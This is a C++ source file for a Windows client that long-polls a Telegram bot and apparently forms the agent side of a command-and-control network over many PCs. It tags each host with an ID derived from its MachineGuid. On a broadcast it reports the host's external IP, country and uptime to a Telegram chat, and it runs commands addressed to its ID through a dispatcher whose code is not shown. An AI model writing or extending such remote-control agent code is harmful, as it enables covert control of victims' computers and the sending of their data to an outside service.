// CPP_TEST.cpp  (복구판: 누락 최소화 중심 설계)
// - /online(브로드캐스트): 즉시 응답 + 지연 ACK(그레이스 윈도우) → 여러 PC가 받을 시간 확보
// - /<ID> ... (내 타깃): 즉시 처리 + 즉시 ACK
// - 그 외(남의 지시): ACK하지 않음 (상대 PC가 ACK하도록)
// - getUpdates limit=100 로 배치 수신 → 오래된 1건에 막혀도 뒤쪽 새 항목까지 같이 파싱
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <cctype>

#include "Config.h"
#include "TelegramApi.h"
#include "Commands.h"
#include "SystemId.h"  // GetStableMachineId8, GetUptimePretty
#include "NetInfo.h"   // GetExternalIpCountryParts, FlagEmojiFromCC

#pragma comment(lib, "winhttp.lib")

// ===== 유틸 =====
static uint32_t Hash32(const std::string& s) {
    uint32_t h = 2166136261u;
    for (unsigned char c : s) { h ^= c; h *= 16777619u; }
    return h;
}

// 폴링 지터(빈 응답시만): 100~300ms
static DWORD SmallJitterMs(const std::string& id8) {
    return 100u + (Hash32(id8) % 201u); // [100,300]
}

// 브로드캐스트 지연 ACK(그레이스): 1500~2500ms (ID별 고정)
static DWORD BroadcastGraceMs(const std::string& id8) {
    return 1500u + (Hash32("grace:" + id8) % 1001u); // [1500,2500]
}

// 제로폭 제거 + 트림 + 소문자화
static std::string NormalizeForMatch(std::string s) {
    auto erase_seq = [&](const char* seq, size_t len) {
        size_t pos = 0;
        const std::string needle(seq, len);
        while ((pos = s.find(needle, pos)) != std::string::npos) s.erase(pos, len);
        };
    // U+200B/U+200C/U+200D/U+FEFF
    erase_seq("\xE2\x80\x8B", 3);
    erase_seq("\xE2\x80\x8C", 3);
    erase_seq("\xE2\x80\x8D", 3);
    erase_seq("\xEF\xBB\xBF", 3);

    // 트림
    size_t a = 0; while (a < s.size() && (unsigned char)s[a] <= 0x20) ++a;
    size_t b = s.size(); while (b > a && (unsigned char)s[b - 1] <= 0x20) --b;
    s = s.substr(a, b - a);

    // ASCII 소문자화
    for (char& c : s) if (c >= 'A' && c <= 'Z') c = char(c + 32);
    return s;
}

static bool StartsWith(const std::string& s, const char* p) {
    return s.rfind(p, 0) == 0;
}

// 브로드캐스트(/online 또는 /online@...)
static bool IsBroadcastOnline(const std::string& txt) {
    const std::string s = NormalizeForMatch(txt);
    return StartsWith(s, "/online") || StartsWith(s, "/online@");
}

// 내 ID 타깃
static bool IsForMe(const std::string& txt, const std::string& id8) {
    const std::string p1 = "/" + id8;            // "/ID"
    const std::string p2 = "/" + id8 + " ";      // "/ID ..."
    const std::string p3 = "/" + id8 + "@";      // "/ID@bot ..."
    return (txt == p1) || (txt.rfind(p2, 0) == 0) || (txt.rfind(p3, 0) == 0);
}

// getUpdates (롱폴링, limit=100으로 배치 수신)
static bool GetUpdates(long long offset, std::string& out) {
    std::wstring path = L"/bot" + BOT_TOKEN + L"/getUpdates";
    std::string body = "timeout=25&limit=100&allowed_updates=%5B%22message%22,%22callback_query%22%5D";
    if (offset > 0) body += "&offset=" + std::to_string(offset);
    return HttpPostForm(path, body, out);
}

// ===== 업데이트 파서 =====
struct Update {
    long long update_id = -1;
    bool is_callback = false;
    long long chat_id = 0;
    std::string text;         // message.text 또는 callback_query.data
    std::string callback_id;  // callback_query.id
};

// 매우 단순한 문자열 파서 (배치 내 여러 항목 순차 탐색)
static bool NextUpdate(const std::string& js, size_t& cur, Update& u) {
    size_t a = js.find("\"update_id\":", cur);
    if (a == std::string::npos) return false;

    size_t a_next = js.find("\"update_id\":", a + 1);
    size_t blockEnd = (a_next == std::string::npos) ? js.size() : a_next;

    // update_id
    size_t p = a + 12; while (p < js.size() && (js[p] == ' ' || js[p] == ':')) ++p;
    long long id = 0; bool any = false;
    while (p < js.size() && std::isdigit((unsigned char)js[p])) { id = id * 10 + (js[p] - '0'); ++p; any = true; }
    u.update_id = any ? id : -1;

    // callback_query?
    size_t cq = js.find("\"callback_query\":", a);
    if (cq != std::string::npos && cq < blockEnd) {
        u.is_callback = true;

        // data
        size_t d = js.find("\"data\":\"", cq);
        if (d != std::string::npos && d < blockEnd) {
            d += 8; size_t e = js.find("\"", d);
            if (e != std::string::npos && e <= blockEnd) u.text = js.substr(d, e - d);
        }

        // chat.id (callback_query.message.chat.id)
        size_t cm = js.find("\"message\":", cq);
        if (cm != std::string::npos && cm < blockEnd) {
            size_t c = js.find("\"chat\":{\"id\":", cm);
            if (c != std::string::npos && c < blockEnd) {
                c += 13; int sign = 1; while (c < js.size() && (js[c] == ' ' || js[c] == ':')) ++c;
                if (c < js.size() && js[c] == '-') { sign = -1; ++c; }
                long long v = 0; bool any2 = false;
                while (c < js.size() && std::isdigit((unsigned char)js[c])) { v = v * 10 + (js[c] - '0'); ++c; any2 = true; }
                u.chat_id = any2 ? sign * v : 0;
            }
        }

        // callback_query.id
        size_t cid = js.find("\"id\":\"", cq);
        if (cid != std::string::npos && cid < blockEnd) {
            cid += 6; size_t e = js.find("\"", cid);
            if (e != std::string::npos && e <= blockEnd) u.callback_id = js.substr(cid, e - cid);
        }
    }
    else {
        u.is_callback = false;

        // message.text
        size_t t = js.find("\"text\":\"", a);
        if (t != std::string::npos && t < blockEnd) {
            t += 8; size_t e = js.find("\"", t);
            if (e != std::string::npos && e <= blockEnd) u.text = js.substr(t, e - t);
        }

        // message.chat.id
        size_t c = js.find("\"chat\":{\"id\":", a);
        if (c != std::string::npos && c < blockEnd) {
            c += 13; int sign = 1; while (c < js.size() && (js[c] == ' ' || js[c] == ':')) ++c;
            if (c < js.size() && js[c] == '-') { sign = -1; ++c; }
            long long v = 0; bool any2 = false;
            while (c < js.size() && std::isdigit((unsigned char)js[c])) { v = v * 10 + (js[c] - '0'); ++c; any2 = true; }
            u.chat_id = any2 ? sign * v : 0;
        }
    }

    cur = (a_next == std::string::npos) ? js.size() : a_next;
    return true;
}

int main() {
    // 디스패치 키 = MachineGuid 8자리
    const std::wstring dispatchIdW = GetStableMachineId8();
    const std::string  dispatchId8 = WToUtf8(dispatchIdW);
    const DWORD jitter = SmallJitterMs(dispatchId8);
    const DWORD grace = BroadcastGraceMs(dispatchId8);

    long long local_offset = 0; // 다음 getUpdates에 사용할 offset

    while (true) {
        std::string resp;
        if (!GetUpdates(local_offset, resp)) { Sleep(500 + jitter); continue; }

        size_t cur = 0;
        Update u{};
        bool any = false;

        // 배치 처리 결과 요약
        bool broadcastSeen = false;
        long long broadcastId = -1;

        bool targetSeen = false;
        long long targetMaxId = -1;

        while (NextUpdate(resp, cur, u)) {
            any = true;

            // 내 그룹만 처리
            if (u.chat_id != CHAT_ID) {
                continue; // ACK하지 않음 (다른 대화방은 무시)
            }

            // 콜백 로딩 종료(즉시)
            if (u.is_callback && !u.callback_id.empty()) {
                AnswerCallback(u.callback_id, "", false);
            }

            const bool isBroadcast = IsBroadcastOnline(u.text);
            const bool isMine = IsForMe(u.text, dispatchId8);

            if (isBroadcast) {
                // /online → 즉시 응답 (버튼 포함)
                const std::wstring id8w = dispatchIdW;

                std::string ip, cc, country;
                bool ok = GetExternalIpCountryParts(ip, cc, country);
                std::wstring ipW = ok ? std::wstring(ip.begin(), ip.end()) : L"UNKNOWN";
                std::wstring flag = ok ? FlagEmojiFromCC(cc) : L"";
                std::wstring ccW = ok ? std::wstring(cc.begin(), cc.end()) : L"";
                std::wstring cnW = ok ? std::wstring(country.begin(), country.end()) : L"UNKNOWN";
                const std::wstring up = GetUptimePretty();

                std::wstring msg;
                msg += id8w + L"\n";
                msg += ipW + L" - ";
                if (!flag.empty()) { msg += flag + L" "; }
                if (!ccW.empty()) { msg += ccW + L" / "; }
                msg += cnW + L"\n";
                msg += up;

                const std::string textUtf8 = WToUtf8(msg);
                const std::string btnText = WToUtf8(L"선택하기");
                const std::string cbData = "/" + dispatchId8 + " info";
                SendTextWithButton(CHAT_ID, textUtf8, btnText, cbData);

                broadcastSeen = true;
                broadcastId = u.update_id; // ← 이 ID까지는 지연 후 한 번에 ACK
                continue;
            }

            if (isMine) {
                // 내 타깃 명령 → 즉시 처리 + 즉시 ACK 후보
                if (DispatchCommand(CHAT_ID, dispatchId8, u.text)) {
                    if (u.update_id > targetMaxId) targetMaxId = u.update_id;
                    targetSeen = true;
                }
                else {
                    // 실패해도 다음으로 진행 (ACK는 아래에서 결정)
                }
                continue;
            }

            // 남의 지시: ACK하지 않고 무시 (상대 PC가 ACK하도록)
            continue;
        }

        if (!any) {
            // 업데이트 없음 → 소량 지터 후 재시도
            Sleep(300 + jitter);
            continue;
        }

        // ACK 결정
        if (targetSeen) {
            // 내 타깃 명령을 처리했으면 바로 ACK (큐 정체 방지)
            local_offset = targetMaxId + 1;
            continue;
        }

        if (broadcastSeen) {
            // 브로드캐스트는 지연 ACK (여러 PC가 받을 그레이스 제공)
            Sleep(grace);
            local_offset = broadcastId + 1;
            continue;
        }

        // 이 배치에선 내 것/브로드캐스트가 없었음 → ACK하지 않음
        // (다른 PC가 ACK할 때까지 기다림, limit=100으로 새 항목은 계속 같이 들어올 수 있음)
        Sleep(120 + (jitter % 120));
        continue;
    }
    return 0;
}
